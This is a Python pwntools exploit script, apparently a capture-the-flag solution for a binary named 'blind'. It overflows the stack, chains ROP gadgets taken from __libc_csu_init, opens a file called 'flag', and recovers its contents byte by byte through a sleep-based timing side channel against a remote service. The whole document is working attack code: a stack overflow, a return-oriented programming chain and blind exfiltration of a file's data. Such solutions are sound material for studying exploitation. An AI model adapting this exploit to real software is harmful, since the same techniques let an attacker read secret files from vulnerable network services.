'''
91xctf-181027-pwn_blind
'''
from pwn import *


def blind(idx,c):
    debug=0

    #context.log_level='debug'
    context.arch='amd64'

    if debug:
        p=process('./blind')
        #p=process('',env={'LD_PRELOAD':'./libc.so'})
        #gdb.attach(p)
    else:
        p=remote('0',1337)

    def ru(x):
        return p.recvuntil(x)

    def se(x):
        p.send(x)

    def gadgets(rdi,rsi,rdx,rbp=0):
            p=flat(prbx, 0, rbp, bss, rdx, rsi, rdi, prbx-0x1a)
            return p

    r=ROP('./blind')
    b=ELF('./blind')

    prdi=r.rdi[0]
    prsi=r.rsi[0]
    prbp=r.rbp[0]
    leave=r.leave[0]

    open_plt=b.plt['open']
    read_plt=b.plt['read']
    sleep_plt=b.plt['sleep']

    bss=b.bss()+0x20
    pr12=b.symbols['__libc_csu_init']+0x5c
    prbx=b.symbols['__libc_csu_init']+0x5a
    addret=b.symbols['__libc_csu_init']+0x78
    cmp = b.symbols['__libc_csu_init']+0x51


    bss_payload= flat( addret, 'flag\x00\x00\x00\x00', 0, pr12, p64(bss+8)*4, cmp, p64(0)*7, prdi, 40, sleep_plt)

    ru('What is your name?\n')
    se(bss_payload)
    ru('Try to overflow, but i think it is useless\n')


    payload = flat('a'*58, prdi, bss+8, prsi, 0, 0, open_plt)

    if idx!=0:
        payload += flat(gadgets(0, bss+0x100, idx), read_plt)

    payload += flat(gadgets(0, bss+16, 0x1), read_plt,
                    prbx, p64(c)*6,
                    prbp, bss+16, leave)


    se(payload)
    start=time.time()
    p.can_recv_raw(timeout=10)
    p.close()
    end=time.time()
    if end-start>8:
        return True
    return False


strings='_{}ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
flag=''
for i in range(0,40):
    for q in strings:
        info('current: '+q)
        if(blind(i,ord(q))):
            flag+=q
            success('flag: '+flag)
            if q=='}':
                exit()
            break